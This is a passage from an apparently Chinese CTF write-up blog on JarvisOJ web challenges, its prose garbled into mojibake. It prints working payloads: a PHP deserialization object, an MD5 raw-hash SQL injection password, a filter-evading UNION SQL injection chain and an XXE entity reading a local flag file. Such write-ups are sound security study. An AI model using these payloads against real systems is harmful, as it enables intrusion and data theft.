&lt;p&gt;åˆšå¼€å§‹ä»¥ä¸ºæ”¹ç«¯å£å°±å®Œäº†ï¼Œï¼Œåæ¥å‘ç°æ˜¯æˆ‘å¤ªèœäº†ï¼Œè¦æ”¹æˆ‘ä»¬çš„è®¿é—®ç«¯å£&lt;br&gt;
 &lt;code&gt;curl --loacl-port 51 http://web.jarvisoj.com:32770/&lt;/code&gt;  å°±æ‹¿åˆ°äº† flagï¼Œï¼Œå­¦åˆ°äº†&lt;/p&gt;
&lt;h2 id=&#34;ç¥ç›¾å±€çš„ç§˜å¯†&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ç¥ç›¾å±€çš„ç§˜å¯†&#34;&gt;#&lt;/a&gt; ç¥ç›¾å±€çš„ç§˜å¯†&lt;/h2&gt;
&lt;p&gt;è¿›å»ä»¥åå°±æ˜¯ä¸€å¼ å›¾ç‰‡&lt;br&gt;
å…ˆ view-source ä¸€ä¸‹çœ‹åˆ°äº†ï¼š&lt;br&gt;
 &lt;code&gt;&amp;lt;img src=&amp;quot;showimg.php?img=c2hpZWxkLmpwZw==&amp;quot; width=&amp;quot;100%&amp;quot;/&amp;gt;&lt;/code&gt; &lt;br&gt;
 çœ‹åˆ°äº†ä¸€ä¸ª showimg.phpï¼Œçœ‹æ ·å­åº”è¯¥å¯ä»¥ç”¨ img è¿™ä¸ªå‚æ•°æ¥è¯»æ–‡ä»¶ï¼Œå…ˆè¯»ä¸€ä¸‹ showimg.php è¿™ä¸ªæ–‡ä»¶ï¼Œæ²¡çœ‹åˆ°å•¥æœ‰ç”¨çš„ä¸œè¥¿ï¼Œå†çœ‹ä¸€ä¸‹ index.php çœ‹åˆ°äº†æœ‰ä¸€ä¸ªååºåˆ—åŒ–çš„ç‚¹ï¼Œçœ‹æ ·å­æ˜¯ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œæºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;require_once&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;shield.php&amp;#x27;&lt;/span&gt;);&lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$x&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Shield();&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;class&amp;#x27;&lt;/span&gt;]) &amp;amp;&amp;amp; &lt;span class=&#34;hljs-variable&#34;&gt;$g&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;class&amp;#x27;&lt;/span&gt;];&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$g&lt;/span&gt;)) &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-variable&#34;&gt;$x&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$g&lt;/span&gt;);&lt;br&gt;	&amp;#125;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$x&lt;/span&gt;-&amp;gt;readfile();&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;çœ‹åˆ°äº† shield.phpï¼Œè¯»ä¸€ä¸‹çœ‹çœ‹ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;//flag is in pctf.php&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Shield&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;;&lt;br&gt;		&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;			&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt; -&amp;gt; file = &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;;&lt;br&gt;		&amp;#125;&lt;br&gt;		&lt;br&gt;		&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;readfile&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;			&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file) &amp;amp;&amp;amp; stripos(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;..&amp;#x27;&lt;/span&gt;)===&lt;span class=&#34;hljs-literal&#34;&gt;FALSE&lt;/span&gt;  &lt;br&gt;			&amp;amp;&amp;amp; stripos(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;)===&lt;span class=&#34;hljs-literal&#34;&gt;FALSE&lt;/span&gt; &amp;amp;&amp;amp; stripos(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\\&amp;#x27;&lt;/span&gt;)==&lt;span class=&#34;hljs-literal&#34;&gt;FALSE&lt;/span&gt;) &amp;#123;&lt;br&gt;				&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; @file_get_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file);&lt;br&gt;			&amp;#125;&lt;br&gt;		&amp;#125;&lt;br&gt;	&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Shield&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;pctf.php&amp;#x27;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$c&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Shield();&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$c&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;â€œview-source:&lt;a href=&#34;http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:%7Bs:4:%22file%22;s:8:%22pctf.php%22;%7D&#34;&gt;http://web.jarvisoj.com:32768/index.php?class=O:6:â€œShieldâ€:1:{s:4:â€œfileâ€;s:8:â€œpctf.phpâ€;}&lt;/a&gt;â€&lt;br&gt;
 å°±æ‹¿åˆ°äº† flag&lt;/p&gt;
&lt;h2 id=&#34;login&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#login&#34;&gt;#&lt;/a&gt; Login&lt;/h2&gt;
&lt;p&gt;æç¤ºè¯´éœ€è¦å¯†ç æ‰èƒ½æ‹¿åˆ° flagï¼Œï¼Œä½†æ˜¯æµ‹è¯•äº†ä¸€ä¸‹å‘ç°å½“è¾“å…¥åŒå¼•å·çš„æ—¶å€™ä¼šæŠ¥ sql é”™è¯¯ï¼Œåº”è¯¥æ˜¯å­˜åœ¨ sql æ³¨å…¥ï¼Œä½†æ˜¯æµ‹è¯•äº†å¥½ä¹…æ²¡å‘ç°æœ‰ä»€ä¹ˆç”¨ï¼Œï¼Œçœ‹äº†ä¸€çœ¼ wp è¦å…ˆæŠ“åŒ…ï¼Œï¼Œåœ¨ head é‡Œé¢æœ‰ hintã€‚ã€‚ã€‚&lt;br&gt;
â€˜Hint: &amp;quot;select * from  &lt;code&gt;admin&lt;/code&gt;  where password=â€™&amp;quot;.md5($pass,true).&amp;quot;â€™&amp;quot;â€™&lt;br&gt;
ç„¶åæƒ³åˆ°åº”è¯¥æ˜¯ md5 çš„å®‰å…¨é—®é¢˜ï¼Œ0e å¼€å¤´çš„é—®é¢˜åº”è¯¥æ˜¯ä¸å­˜åœ¨ï¼Œå‚è€ƒäº†ä¸€ä¸‹ https://www.cnblogs.com/piaomiaohongchen/p/10659359.html&lt;br&gt;
 è¯•äº†ä¸€ä¸‹æ–‡ä¸­ç»™å‡ºçš„å¯†ç  ffifdyop å°±æ‹¿åˆ°äº† flag&lt;/p&gt;
&lt;h2 id=&#34;admin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#admin&#34;&gt;#&lt;/a&gt; admin&lt;/h2&gt;
&lt;p&gt;æ‰“å¼€ç½‘é¡µåªæœ‰ä¸€ä¸ª hello worldï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç æ²¡çœ‹åˆ°å•¥æœ‰ç”¨çš„ä¸œè¥¿ï¼Œäºæ˜¯å°±çœ‹çœ‹æœ‰æ²¡æœ‰ robots.txtï¼Œçœ‹åˆ°äº† admin_s3cr3t.phpï¼Œè®¿é—®æ‹¿åˆ°å‡çš„ flagï¼Œæƒ³äº†æƒ³åº”è¯¥æ˜¯è·Ÿ cookie æœ‰å…³ï¼Œäºæ˜¯å°±æŠ“åŒ…çœ‹çœ‹ï¼Œåº”è¯¥æ˜¯åœ¨ cookie æœ‰åˆ¤æ–­æ˜¯ä¸æ˜¯ adminï¼Œä½†æ˜¯æˆ‘æŠ“åˆ°çš„åŒ…æ²¡æœ‰ cookieï¼Œåè€Œæ˜¯çœ‹åˆ°ä¸€ä¸ªç±»ä¼¼äº base64 çš„ä¸€ä¸²ç¼–ç ï¼Œå°±ä¸€ç›´åœ¨æè¿™ä¸ªä¹Ÿæ²¡æå‡ºä¸ªå•¥ï¼Œåæ¥çœ‹äº†ä¸€ä¸‹ wp åˆ«äººå°±æœ‰æŠ“åˆ° admin=0.ã€‚ã€‚ã€‚æˆ‘å°±é‡æ–°åˆ·æ–°é‡æ–°æŠ“äº†ä¸€ä¸‹åŒ…æ‰çœ‹åˆ°äº†è¿™ç©æ„ï¼Œï¼Œæ”¹æˆ 1 å°±æ‹¿åˆ°äº† flagï¼Œçœ‹æ¥åº”è¯¥æ˜¯è¿˜æ²¡æœ‰è®¾ç½® cookie å°±è¢«æˆ‘æŠ“åŒ…äº†ï¼Œï¼Œï¼Œå®³ï¼Œä¸‹æ¬¡æ³¨æ„&lt;/p&gt;
&lt;h2 id=&#34;in-a-mess&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#in-a-mess&#34;&gt;#&lt;/a&gt; IN A mess&lt;/h2&gt;
&lt;p&gt;1. æŸ¥çœ‹ç½‘é¡µæºä»£ç è®©æˆ‘è®¿é—® index.phpsï¼Œçœ‹åˆ°æºç &lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;error_reporting(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;!--index.phps--&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;])&lt;br&gt;&amp;#123;&lt;br&gt;	header(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Location: index.php?id=1&amp;#x27;&lt;/span&gt;);&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;exit&lt;/span&gt;();&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$id&lt;/span&gt;=&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;=&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(stripos(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;))&lt;br&gt;&amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Hahahahahaha&amp;#x27;&lt;/span&gt;;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; ;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; = @file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt;==&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1112 is a nice lab!&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$id&lt;/span&gt;==&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; strlen(&lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;)&amp;gt;&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; eregi(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;111&amp;quot;&lt;/span&gt;.substr(&lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;),&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1114&amp;quot;&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; substr(&lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)!=&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;)&lt;br&gt;&amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;require&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.txt&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&lt;br&gt;&amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;work harder!harder!harder!&amp;quot;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°ä¸»è¦å°±æ˜¯é‚£ä¸€å±‚ if&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;$data ç”¨ php://input ä¼ è¿›å»&lt;/li&gt;
&lt;li&gt;id=0&lt;/li&gt;
&lt;li&gt;b é•¿åº¦è¦å¤§äº 5 ä½†æ˜¯è¦æ»¡è¶³ç¬¬äºŒã€ä¸‰å±‚è¦é•¿åº¦ä¸º 0ï¼Œè¿™æ—¶å€™å°±è¦è®© b=%0011111ï¼Œstrlen ä¸ä¼šè¢«æˆªæ–­ï¼Œsubstr ä¼šè¢«æˆªæ–­&lt;/li&gt;
&lt;li&gt;ç„¶åè®©æˆ‘ä»¬è®¿é—® http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1ï¼Œåˆçœ‹åˆ°äº† id=1ï¼Œæœ‰å¯èƒ½æ˜¯æ³¨å…¥&lt;/li&gt;
&lt;li&gt;ç”¨å•å¼•å·æµ‹è¯•å‘ç°ç›´æ¥è¿”å›äº† sql è¯­å¥ï¼Œé‚£çœ‹æ¥åº”è¯¥å°±æ˜¯ sql æ³¨å…¥äº†&lt;/li&gt;
&lt;li&gt;æµ‹è¯•å‘ç°è¿‡æ»¤äº†ç©ºæ ¼è¿™ä¸ªå¯ä»¥ç”¨æ³¨é‡Šç¬¦ /**/ ç»•è¿‡ï¼Œä½†æ˜¯å‘ç°ç›´æ¥ç”¨ä¼šè¢«è¿‡æ»¤ï¼Œè¯•ç€å¾€é‡Œé¢åŠ ç‚¹ä¸œè¥¿å°±å¥½äº†&lt;/li&gt;
&lt;li&gt;ç”¨ &lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#&lt;/code&gt; æµ‹è¯•å¾—åˆ°å­—æ®µæ•°ä¸º 3&lt;/li&gt;
&lt;li&gt;ç”¨ &lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,database()/*1*/#&lt;/code&gt; æ‹¿åˆ°æ•°æ®åº“åæ˜¯ test&lt;/li&gt;
&lt;li&gt;ç”¨ &lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,table_name/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374#&lt;/code&gt; æ‹¿åˆ°è¡¨å content&lt;/li&gt;
&lt;li&gt;ç”¨ &lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74#&lt;/code&gt; å¾—åˆ°å­—æ®µåæ˜¯ id,context,title&lt;/li&gt;
&lt;li&gt;ç”¨ &lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(context)/*1*/frofromm/*1*/content#&lt;/code&gt; æ‹¿åˆ° flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;apiè°ƒç”¨&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#apiè°ƒç”¨&#34;&gt;#&lt;/a&gt; api è°ƒç”¨&lt;/h2&gt;
&lt;p&gt;ç”±äºé»˜è®¤ä¼ è¾“æ˜¯ json æ ¼å¼ï¼Œå…ˆæŠ“åŒ…æŠŠæ ¼å¼æ”¹æˆ xmlï¼Œç„¶åä¼  payload`&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;&lt;/p&gt;
 &lt;!DOCTYPE foo [
 &lt;!ENTITY myentity SYSTEM &#34;file:///home/ctf/flag.txt&#34; &gt;]&gt;
&lt;p&gt;&lt;abc&gt;&amp;amp;myentity;&lt;/abc&gt;` å°±æ‹¿åˆ°äº† flag&lt;/p&gt;
&lt;h2 id=&#34;web-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web-2&#34;&gt;#&lt;/a&gt; WEBï¼Ÿ&lt;/h2&gt;
